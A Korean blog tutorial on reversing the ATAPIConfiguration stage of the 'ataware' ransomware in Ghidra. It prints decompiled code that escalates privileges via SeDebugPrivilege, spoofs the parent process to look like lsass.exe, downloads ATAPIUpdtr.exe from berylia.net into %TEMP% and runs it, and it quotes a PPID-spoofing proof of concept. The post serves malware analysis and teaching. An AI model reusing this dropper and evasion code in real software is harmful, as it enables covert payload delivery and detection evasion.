---
title: "[Research] Re:versing으로 시작하는 ghidra 생활 Part 5 - Malware Analysis (2)"
author: idioth
tags: [idioth, reversing, ghidra, ghidra tutorials, malware, ransomware]
categories: [Research]
date: 2021-07-11 18:00:00
cc: true
index_img: /2021/07/11/idioth/ghidra_part5/thumbnail.jpg
---
**다른 파트 보러가기**

[Re:versing으로 시작하는 ghidra 생활 Part 1 - Overview](https://hackyboiz.github.io/2021/02/07/idioth/ghidra_part1/)

[Re:versing으로 시작하는 ghidra 생활 Part 2 - Data, Functions, Scripts](https://hackyboiz.github.io/2021/03/07/idioth/ghidra_part2/)

[Re:versing으로 시작하는 ghidra 생활 Part 3 - tips for IDA User (Here!)](https://hackyboiz.github.io/2021/04/04/idioth/ghidra_part3/)

[Re:versing으로 시작하는 ghidra 생활 Part 4 - Malware Analysis (1)](https://hackyboiz.github.io/2021/05/19/idioth/ghidra_part4/)

Re:versing으로 시작하는 ghidra 생활 Part 5 - Malware Analysis (2) (Here!)

---

안녕하세요. idioth입니다. 여러모로 일정이 딜레이가 되어서 이번 파트를 작성하는데 꽤 오랜 시간이 걸렸네요. 이번 게시글에서는 ataware 랜섬웨어의 ATAPIConfiguration 부분에 대해 분석할 예정이에요. 세 개의 바이너리 (ATAPIinit, ATAPIConfiguration, ATAPIUpdtr)를 분석한다고 하였지만, 사용하는 기능 자체가 크게 다르지 않고 악성코드 분석에 치중되는 것 같아 이번 파트를 마지막으로 ghidra 시리즈는 완료될 예정입니다.

# 서론

저번 게시글에서 ATAPIinit 바이너리가 `dropboxusercontent` 링크에 접속하여 ATAPIConfiguration을 다운로드하는 것을 확인했습니다. 해당 링크는 현재 비활성화되어 있으므로 바이너리는 [app.any.run](https://www.notion.so/3a72818cfd7e4c05aa3ca52a894ae0d6)에서 구할 수 있습니다.

![](ghidra_part5/Untitled.png)

Detect It Easy로 확인한 결과 저번과 동일하게 mingw gcc로 컴파일이 된 파일임을 알 수 있습니다.

![](ghidra_part5/Untitled%201.png)

이번에는 저번과 달리 크게 눈에 띄는 문자열은 없지만, `wininet.dll`, `berylia.net`, `Wlsass.exe` 문자열을 보고 유추해볼 때, 해당 링크에 network 접속을 하여 `Wlsass.exe` 파일을 다운로드하는 것으로 추정할 수 있겠네요.

# Ghidra를 통한 기초 정적 분석

![](ghidra_part5/Untitled%202.png)

벌써 마지막 파트까지 도달했으니 이제 바이너리 정도는 가뿐하게 열고 analyze를 하실 수 있겠죠? ATAPIConfiguration을 추가해준 후 analyze까지 해줍니다.

```cpp
undefined4 FUN_00401cb7(void)

{
  bool bVar1;
  HMODULE pHVar2;
  int iVar3;
  undefined3 extraout_var;
  undefined4 uVar4;
  HANDLE hHeap;
  undefined4 local_2c4 [2];
  undefined4 local_2bc;
  wchar_t awStack672 [260];
  SIZE_T local_98;
  undefined local_94 [16];
  undefined4 local_84 [17];
  LPVOID local_40;
  int local_3c [2];
  FARPROC local_34;
  FARPROC local_30;
  FARPROC local_2c;
  FARPROC local_28;
  DWORD local_24;
  FARPROC local_20;
  FARPROC local_1c;
  int local_18;
  FARPROC local_14;
  undefined4 local_10;
  
  local_3c[0] = 0;
  pHVar2 = GetModuleHandleW(L"kernel32.dll");
  local_14 = GetProcAddress(pHVar2,"CreateToolhelp32Snapshot");
  local_18 = (*local_14)(2,0);
  local_2c4[0] = 0x22c;
  pHVar2 = GetModuleHandleW(L"kernel32.dll");
  local_1c = GetProcAddress(pHVar2,"Process32FirstW");
  pHVar2 = GetModuleHandleW(L"kernel32.dll");
  local_20 = GetProcAddress(pHVar2,"Process32NextW");
  iVar3 = (*local_1c)(local_18,local_2c4);
  if (iVar3 == 0) {
    local_24 = GetLastError();
  }
  do {
    iVar3 = wcscmp(awStack672,L"lsass.exe");
    if (iVar3 == 0) {
      local_10 = local_2bc;
    }
    iVar3 = (*local_20)(local_18,local_2c4);
  } while (iVar3 != 0);
  bVar1 = FUN_00401b91();
  if (CONCAT31(extraout_var,bVar1) == 0) {
    uVar4 = 0;
  }
  else {
    pHVar2 = GetModuleHandleW(L"kernel32.dll");
    local_28 = GetProcAddress(pHVar2,"OpenProcess");
    local_3c[0] = (*local_28)(0x1f0fff,0,local_10);
    if (local_3c[0] == 0) {
      uVar4 = 0;
    }
    else {
      memset(local_84,0,0x48);
      pHVar2 = GetModuleHandleW(L"kernel32.dll");
      local_2c = GetProcAddress(pHVar2,"InitializeProcThreadAttributeList");
      pHVar2 = GetModuleHandleW(L"kernel32.dll");
      local_30 = GetProcAddress(pHVar2,"UpdateProcThreadAttribute");
      (*local_2c)(0,1,0,&local_98);
      hHeap = GetProcessHeap();
      local_40 = HeapAlloc(hHeap,0,local_98);
      (*local_2c)(local_40,1,0,&local_98);
      (*local_30)(local_40,0,0x20000,local_3c,4,0,0);
      local_84[0] = 0x48;
      pHVar2 = GetModuleHandleW(L"kernel32.dll");
      local_34 = GetProcAddress(pHVar2,"CreateProcessA");
      FUN_00401570();
      iVar3 = (*local_34)(DAT_00416028,0,0,0,1,0x80010,0,0,local_84,local_94);
      if (iVar3 == 0) {
        uVar4 = 0;
      }
      else {
        uVar4 = 1;
      }
    }
  }
  return uVar4;
}
```

이번 바이너리에서 중점적으로 분석할 부분은 `FUN_00401cb7`입니다. 역시... 처음 열었을 때는 보기가 상당히 불편하네요. 이 변수가 어떤 건지도 모르겠고~ 저번 시간과 같이 보기 편하게 정리해봅시다.

```cpp
undefined4 FUN_00401cb7(void)

{
  bool bVar1;
  HMODULE hModule;
  WINBOOL WVar2;
  int iVar3;
  undefined3 extraout_var;
  undefined4 uVar4;
  HANDLE hHeap;
  PROCESSENTRY32W lppe;
  SIZE_T local_98;
  _PROCESS_INFORMATION local_94;
  _STARTUPINFOA local_84;
  LPPROC_THREAD_ATTRIBUTE_LIST local_40;
  HANDLE proc_handle [2];
  CreateProcessA *CreateProcessA_addr;
  UpdateProcThreadAttribute *UpdateProcThreadAttribute_addr;
  InitializeProcThreadAttributeList *InitializeProcThreadAttributeList_addr;
  OpenProcess *OpenProcess_addr;
  DWORD local_24;
  Process32NextW *Process32NextW_addr;
  Process32FirstW *Process32FirstW_addr;
  HANDLE hSnapshot;
  CreateToolhelp32Snapshot *CreateToolhelp32Snapshot_addr;
  DWORD pid;
  
  proc_handle[0] = (HANDLE)0x0;
  hModule = GetModuleHandleW(L"kernel32.dll");
  CreateToolhelp32Snapshot_addr =
       (CreateToolhelp32Snapshot *)GetProcAddress(hModule,"CreateToolhelp32Snapshot");
  hSnapshot = (*CreateToolhelp32Snapshot_addr)(2,0);
  lppe.dwSize = 0x22c;
  hModule = GetModuleHandleW(L"kernel32.dll");
  Process32FirstW_addr = (Process32FirstW *)GetProcAddress(hModule,"Process32FirstW");
  hModule = GetModuleHandleW(L"kernel32.dll");
  Process32NextW_addr = (Process32NextW *)GetProcAddress(hModule,"Process32NextW");
  WVar2 = (*Process32FirstW_addr)(hSnapshot,(LPPROCESSENTRY32W)&lppe);
  if (WVar2 == 0) {
    local_24 = GetLastError();
  }
  do {
    iVar3 = wcscmp(lppe.szExeFile,L"lsass.exe");
    if (iVar3 == 0) {
      pid = lppe.th32ProcessID;
    }
    WVar2 = (*Process32NextW_addr)(hSnapshot,(LPPROCESSENTRY32W)&lppe);
  } while (WVar2 != 0);
  bVar1 = FUN_00401b91();
  if (CONCAT31(extraout_var,bVar1) == 0) {
    uVar4 = 0;
  }
  else {
    hModule = GetModuleHandleW(L"kernel32.dll");
    OpenProcess_addr = (OpenProcess *)GetProcAddress(hModule,"OpenProcess");
    proc_handle[0] = (*OpenProcess_addr)(0x1f0fff,0,pid);
    if (proc_handle[0] == (HANDLE)0x0) {
      uVar4 = 0;
    }
    else {
      memset(&local_84,0,0x48);
      hModule = GetModuleHandleW(L"kernel32.dll");
      InitializeProcThreadAttributeList_addr =
           (InitializeProcThreadAttributeList *)
           GetProcAddress(hModule,"InitializeProcThreadAttributeList");
      hModule = GetModuleHandleW(L"kernel32.dll");
      UpdateProcThreadAttribute_addr =
           (UpdateProcThreadAttribute *)GetProcAddress(hModule,"UpdateProcThreadAttribute");
      (*InitializeProcThreadAttributeList_addr)((LPPROC_THREAD_ATTRIBUTE_LIST)0x0,1,0,&local_98);
      hHeap = GetProcessHeap();
      local_40 = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(hHeap,0,local_98);
      (*InitializeProcThreadAttributeList_addr)(local_40,1,0,&local_98);
      (*UpdateProcThreadAttribute_addr)(local_40,0,0x20000,proc_handle,4,(PVOID)0x0,(PSIZE_T)0x0);
      local_84.cb = 0x48;
      hModule = GetModuleHandleW(L"kernel32.dll");
      CreateProcessA_addr = (CreateProcessA *)GetProcAddress(hModule,"CreateProcessA");
      FUN_00401570();
      WVar2 = (*CreateProcessA_addr)
                        (DAT_00416028,(LPSTR)0x0,(LPSECURITY_ATTRIBUTES)0x0,
                         (LPSECURITY_ATTRIBUTES)0x0,1,0x80010,(LPVOID)0x0,(LPCSTR)0x0,
                         (LPSTARTUPINFOA)&local_84,(LPPROCESS_INFORMATION)&local_94);
      if (WVar2 == 0) {
        uVar4 = 0;
      }
      else {
        uVar4 = 1;
      }
    }
  }
  return uVar4;
}
```

보기가 좀 편해진 거 같은 느낌이 듭니다. 전체적인 부분을 훑어봤을 때 프로세스를 탐색을 하며 `lsass.exe`와 비교하고 같을 시 해당 프로세스의 ID를 가져옵니다. 그 후 `FUN_00401b91`을 호출하네요. 그 후 가져온 `lsass.exe`의 프로세스 핸들을 열고 `IntitializeProcThreaddAttributeList`, `UpdateProcThreadAttribute` 등을 호출하는 걸 보아... [PPID Spoofing](https://www.ired.team/offensive-security/defense-evasion/parent-process-id-ppid-spoofing)을 진행하는 거 같습니다. 해당 링크에서 확인할 수 있는 `ppid-spoofing.cpp` 코드와 비교해볼까요?

```cpp
#include <windows.h>
#include <TlHelp32.h>
#include <iostream>

int main() 
{
	STARTUPINFOEXA si;
	PROCESS_INFORMATION pi;
	SIZE_T attributeSize;
	ZeroMemory(&si, sizeof(STARTUPINFOEXA));
	
	HANDLE parentProcessHandle = OpenProcess(MAXIMUM_ALLOWED, false, 6200);

	InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
	si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
	InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);
	UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentProcessHandle, sizeof(HANDLE), NULL, NULL);
	si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

	CreateProcessA(NULL, (LPSTR)"notepad", NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);

	return 0;
}
```

사용하는 함수, 파라미터가 동일한 것을 확인하실 수 있어요. 그럼 이 행위를 왜 하느냐?

![](ghidra_part5/Untitled%203.png)

당연히 탐지를 피하기 위해서! PPID Spoofing을 하면 해당 프로세스가 `lsass.exe`에 의해서 생성된 것으로 보이도록 하므로 탐지를 피할 수 있습니다. (물론 탐지 방법도 존재하지만요.)

```cpp
CreateProcessA_addr = (CreateProcessA *)GetProcAddress(hModule,"CreateProcessA");
      FUN_00401570();
      WVar2 = (*CreateProcessA_addr)
                        (DAT_00416028,(LPSTR)0x0,(LPSECURITY_ATTRIBUTES)0x0,
                         (LPSECURITY_ATTRIBUTES)0x0,1,0x80010,(LPVOID)0x0,(LPCSTR)0x0,
                         (LPSTARTUPINFOA)&local_84,(LPPROCESS_INFORMATION)&local_94);
```

PPID Spoofing을 진행한 후, 밑에 코드를 확인하면 `FUN_00401570`을 호출한 후 `CreateProcess`를 통해 프로세스를 실행하는 것을 볼 수 있습니다.

정리하자면 해당 함수는 `lsass.exe`의 PID를 가져오고 `FUN_00401b91`을 호출한 후 PPID Spoofing을 진행한 뒤 `FUN_00401570`을 호출합니다. 그 후 `CreateProcessA`를 통해 추가적인 프로세스를 실행하네요.

근데 아까 위에서 확인했던 주소와 `Wlsass.exe`가 아직 나타나지 않았습니다. 음... 다운로드 기능이 추가되어있을 것 같은데? `FUN_00401b91`을 먼저 확인하면서 어떠한 행위를 하는지 확인해보죠!

```cpp
bool token_priv_escalate(void)

{
  HANDLE thread_handle;
  WINBOOL WVar1;
  DWORD DVar2;
  int iVar3;
  HANDLE token_handle;
  ImpersonateSelf *ImpersonateSelf_addr;
  OpenThreadToken *OpenThreadToken_addr;
  
  OpenThreadToken_addr = (OpenThreadToken *)GetProcAddress(DAT_0041601c,"OpenThreadToken");
  thread_handle = GetCurrentThread();
  WVar1 = (*OpenThreadToken_addr)(thread_handle,0x28,0,&token_handle);
  if (WVar1 == 0) {
    DVar2 = GetLastError();
    if (DVar2 != 0x3f0) {
      return false;
    }
    ImpersonateSelf_addr = (ImpersonateSelf *)GetProcAddress(DAT_0041601c,"ImpersonateSelf");
    WVar1 = (*ImpersonateSelf_addr)(SecurityImpersonation);
    if (WVar1 == 0) {
      return false;
    }
    thread_handle = GetCurrentThread();
    WVar1 = (*OpenThreadToken_addr)(thread_handle,0x28,0,&token_handle);
    if (WVar1 == 0) {
      return false;
    }
  }
  iVar3 = FUN_00401a9e(token_handle,L"SeDebugPrivilege");
  if (iVar3 == 0) {
    CloseHandle(token_handle);
  }
  return iVar3 != 0;
}
```

스레드 토큰을 가져오고, Impersonation을 하고... 가장 결정적으로 `SeDebugPrivilege`를 호출합니다. Privilege 단어만 봐도 짐작이 되는군요. 흠흠... 해당 Token Privilege Escalation 인 것 같습니다! SeDebugPrivilege escalation 등으로 구글링을 해보면

![](ghidra_part5/Untitled%204.png)

[https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens)

토큰을 통해 권한 상승을 하는 방법에 대해서 나와 있습니다. 밑으로 내려보면?

![](ghidra_part5/Untitled%205.png)

`SeDebugPrivilege`가 존재합니다.

![](ghidra_part5/Untitled%206.png)

`FUN_00401a9e`를 확인해보면 `AdjustTokenPrivileges`를 통해 액세스 토큰에 대한 권한을 설정하는 걸 확인할 수 있습니다. 그러면 `FUN_00401b91` 부분은 Token Privilege escalation을 하는 부분이네요. 그럼 다음 분석해야 할 부분인 `FUN_00401570`을 확인해볼까요?

```cpp
undefined4 FUN_00401570(void)

{
  char cVar1;
  bool bVar2;
  undefined4 uVar3;
  HMODULE hModule;
  WINBOOL WVar4;
  size_t temp_path_len;
  undefined4 *puVar5;
  uint uVar6;
  char *pcVar7;
  DWORD local_60;
  DWORD local_5c;
  DWORD local_58;
  uint local_54;
  InternetCloseHandle *InternetCloseHandle_addr;
  WriteFile *WriteFile_addr;
  InternetReadFile *InternetReadFile_addr;
  HANDLE local_44;
  CreateFileW *CreateFileW_addr;
  char *temp_path;
  void *local_38;
  WINBOOL local_34;
  HttpSendRequestA *HttpSendRequestA_addr;
  InternetSetOptionW *InternetSetOptionW_addr;
  InternetQueryOptionW *InternetQueryOptionW_addr;
  HINTERNET local_24;
  HttpOpenRequestW *HttpOpenRequestW_addr;
  HINTERNET local_1c;
  InternetConnectW *InternetConnectW_addr;
  HINTERNET local_14;
  InternetOpenW *InternetOpenW_addr;
  
  InternetOpenW_addr = (InternetOpenW *)GetProcAddress(DAT_00416020,"InternetOpenW");
  local_14 = (*InternetOpenW_addr)(L"WINDOWS",0,(LPCWSTR)0x0,(LPCWSTR)0x0,0);
  if (local_14 == (HINTERNET)0x0) {
    uVar3 = 0xe;
  }
  else {
    hModule = GetModuleHandleW(L"wininet.dll");
    InternetConnectW_addr = (InternetConnectW *)GetProcAddress(hModule,"InternetConnectW");
    local_1c = (*InternetConnectW_addr)
                         (local_14,L"berylia.net",0x1bb,(LPCWSTR)0x0,(LPCWSTR)0x0,3,0,1);
    if (local_1c == (HINTERNET)0x0) {
      uVar3 = 0xe;
    }
    else {
      hModule = GetModuleHandleW(L"wininet.dll");
      HttpOpenRequestW_addr = (HttpOpenRequestW *)GetProcAddress(hModule,"HttpOpenRequestW");
      local_24 = (*HttpOpenRequestW_addr)
                           (local_1c,L"GET",L"/index/",(LPCWSTR)0x0,(LPCWSTR)0x0,(LPCWSTR *)0x0,
                            0x800000,1);
      if (local_24 == (HINTERNET)0x0) {
        uVar3 = 0xe;
      }
      else {
        local_58 = 4;
        hModule = GetModuleHandleW(L"wininet.dll");
        InternetQueryOptionW_addr =
             (InternetQueryOptionW *)GetProcAddress(hModule,"InternetQueryOptionW");
        WVar4 = (*InternetQueryOptionW_addr)(local_24,0x1f,&local_54,&local_58);
        if (WVar4 != 0) {
          hModule = GetModuleHandleW(L"wininet.dll");
          InternetSetOptionW_addr =
               (InternetSetOptionW *)GetProcAddress(hModule,"InternetSetOptionW");
          local_54 = local_54 | 0x1180;
          (*InternetSetOptionW_addr)(local_24,0x1f,&local_54,4);
        }
        hModule = GetModuleHandleW(L"wininet.dll");
        HttpSendRequestA_addr = (HttpSendRequestA *)GetProcAddress(hModule,"HttpSendRequestA");
        local_34 = (*HttpSendRequestA_addr)(local_24,(LPCSTR)0x0,0,(LPVOID)0x0,0);
        local_38 = malloc(16000);
        memset(local_38,0,16000);
        memset(DAT_00416024,0,0x1000);
        temp_path = getenv("TEMP");
        temp_path_len = strlen(temp_path);
        DAT_00416028 = (LPCSTR)malloc(temp_path_len + 0x1000);
        strcpy(DAT_00416028,temp_path);
        uVar6 = 0xffffffff;
        pcVar7 = DAT_00416028;
        do {
          if (uVar6 == 0) break;
          uVar6 = uVar6 - 1;
          cVar1 = *pcVar7;
          pcVar7 = pcVar7 + 1;
        } while (cVar1 != '\0');
        puVar5 = (undefined4 *)(DAT_00416028 + (~uVar6 - 1));
        *puVar5 = 0x4154415c;
        puVar5[1] = 0x70554950;
        puVar5[2] = 0x2e727464;
        puVar5[3] = 0x657865;
        MultiByteToWideChar(0,0,DAT_00416028,-1,DAT_00416024,0x1000);
        hModule = GetModuleHandleW(L"kernel32.dll");
        CreateFileW_addr = (CreateFileW *)GetProcAddress(hModule,"CreateFileW");
        local_44 = (*CreateFileW_addr)(DAT_00416024,0xc0000000,0,(LPSECURITY_ATTRIBUTES)0x0,2,0x80,
                                       (HANDLE)0x0);
        local_5c = 0;
        hModule = GetModuleHandleW(L"wininet.dll");
        InternetReadFile_addr = (InternetReadFile *)GetProcAddress(hModule,"InternetReadFile");
        hModule = GetModuleHandleW(L"kernel32.dll");
        WriteFile_addr = (WriteFile *)GetProcAddress(hModule,"WriteFile");
        if (local_34 == 0) {
          uVar3 = 0xe;
        }
        else {
          local_60 = 0;
          while( true ) {
            WVar4 = (*InternetReadFile_addr)(local_24,local_38,0x2000,&local_60);
            if ((WVar4 == 0) || (local_60 == 0)) {
              bVar2 = false;
            }
            else {
              bVar2 = true;
            }
            if (!bVar2) break;
            (*WriteFile_addr)(local_44,local_38,local_60,&local_5c,(LPOVERLAPPED)0x0);
          }
          hModule = GetModuleHandleW(L"wininet.dll");
          InternetCloseHandle_addr =
               (InternetCloseHandle *)GetProcAddress(hModule,"InternetCloseHandle");
          CloseHandle(local_44);
          (*InternetCloseHandle_addr)(local_14);
          (*InternetCloseHandle_addr)(local_1c);
          (*InternetCloseHandle_addr)(local_24);
          uVar3 = 1;
        }
      }
    }
  }
  return uVar3;
}
```

상당히 기네요... 나눠서 살펴보아야 할 것 같습니다. 중요한 부분만 뽑아내서 살펴보도록 합시다.

```cpp
InternetConnectW_addr = (InternetConnectW *)GetProcAddress(hModule,"InternetConnectW");
local_1c = (*InternetConnectW_addr)
           (local_14,L"berylia.net",0x1bb,(LPCWSTR)0x0,(LPCWSTR)0x0,3,0,1);
```

위에서 문자열을 살펴볼 때 나왔던 `berylia.net`이 여기서 나오네요. `InternetConnectW`로 해당 주소에 연결합니다.

```cpp
HttpOpenRequestW_addr = (HttpOpenRequestW *)GetProcAddress(hModule,"HttpOpenRequestW");
local_24 = (*HttpOpenRequestW_addr)
           (local_1c,L"GET",L"/index/",(LPCWSTR)0x0,(LPCWSTR)0x0,(LPCWSTR *)0x0,
            0x800000,1);
```

그리고 GET Request를 보내네요. 음. 대충 예상을 해보면 request를 통해 파일을 다운로드한다라는 가정을 세울 수 있겠습니다. 밑에를 더 확인해볼까요?

```cpp
temp_path = getenv("TEMP");
temp_path_len = strlen(temp_path);
DAT_00416028 = (LPCSTR)malloc(temp_path_len + 0x1000);
strcpy(DAT_00416028,temp_path);
```

환경변수에 설정되어 있는 TEMP 폴더의 경로를 받아오네요. 위에 정보에서 더 추가를 해보면 temp 경로에 파일을 저장한다.

```cpp
MultiByteToWideChar(0,0,DAT_00416028,-1,DAT_00416024,0x1000);
hModule = GetModuleHandleW(L"kernel32.dll");
CreateFileW_addr = (CreateFileW *)GetProcAddress(hModule,"CreateFileW");
local_44 = (*CreateFileW_addr)(DAT_00416024,0xc0000000,0,(LPSECURITY_ATTRIBUTES)0x0,2,0x80,
                               (HANDLE)0x0);
local_5c = 0;
hModule = GetModuleHandleW(L"wininet.dll");
InternetReadFile_addr = (InternetReadFile *)GetProcAddress(hModule,"InternetReadFile");
hModule = GetModuleHandleW(L"kernel32.dll");
WriteFile_addr = (WriteFile *)GetProcAddress(hModule,"WriteFile");
if (local_34 == 0) {
    uVar3 = 0xe;
}
else {
    local_60 = 0;
    while( true ) {
        WVar4 = (*InternetReadFile_addr)(local_24,local_38,0x2000,&local_60);
        if ((WVar4 == 0) || (local_60 == 0)) {
            bVar2 = false;
        }
        else {
            bVar2 = true;
        }
        if (!bVar2) break;
        (*WriteFile_addr)(local_44,local_38,local_60,&local_5c,(LPOVERLAPPED)0x0);
}
```

어김없이 예상은 적중합니다. `InternetReadFile`을 통해서 파일을 읽어와 `%TEMP%`에 `CreateFile`을 하는군요. 저장되는 파일의 이름은 무엇일까...

![](ghidra_part5/Untitled%207.png)

`ATAPIUpdtr.exe` 파일이네요.

# 정리

자 이제 정리를 해봅시다. 큼직큼직한 행위를 간단하게 정리하면 다음과 같아요.

1. `lsass.exe`의 PID를 가져온다.
2. Token을 활용해 권한을 상승시킨다.
3. PPID Spoofing을 진행한다.
4. `berylia.net`에서 `ATAPIUpdtr.exe`를 `%TEMP%`에 다운로드한다.
5. 실행!

어... 너무 간단하네요. 하핫! 음... ~~어떻게 끝내야 하지?~~ 이번 파트는 저의 예상이 틀리지 않았음을 보여주는 부분이었던 거 같아요. ghidra의 활용법에 집중하기보다는 악성코드 분석이 우선이 되었던 것 같습니다. (사용하는 기능이 똑같아서 어쩔 수 없어요.) Malware analysis 파트를 1로 끝냈으면 좋았을 텐데...

아무튼! 그래도 오랫동안 글을 작성했네요. 도움이 되셨으면 좋겠습니다만... 저는 미개한 실력을 가지고 있는 사람이라서... ㅠㅠ... ghidra 파트는 더 다룰 부분이 없는 것 같아 이제 종료하려고 합니다! 다다음주에 악성코드 분석 VM 자동화의 마지막 파트도 업로드되니 기다려 주세용~ 그럼 이만!